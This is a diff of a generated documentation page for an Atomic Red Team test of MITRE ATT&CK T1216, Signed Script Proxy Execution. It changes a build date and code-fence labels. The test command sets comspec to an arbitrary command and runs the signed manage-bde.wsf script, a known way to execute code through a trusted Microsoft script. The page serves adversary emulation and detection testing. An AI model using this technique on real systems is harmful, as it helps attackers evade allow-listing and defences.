@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1216"
 attack_technique_name: "Signed Script Proxy Execution"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "2a8f2d3c-3dec-4262-99dd-150cb2a4d63a"
@@ -50,14 +50,14 @@ Executes the signed manage-bde.wsf script with options to execute an arbitrary c
 
 ### Command
 
-```commandprompt
+```cmd
 set comspec=#{command_to_execute}
 cscript %windir%\System32\manage-bde.wsf
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 set comspec=%windir%\System32\cmd.exe
 ```
 
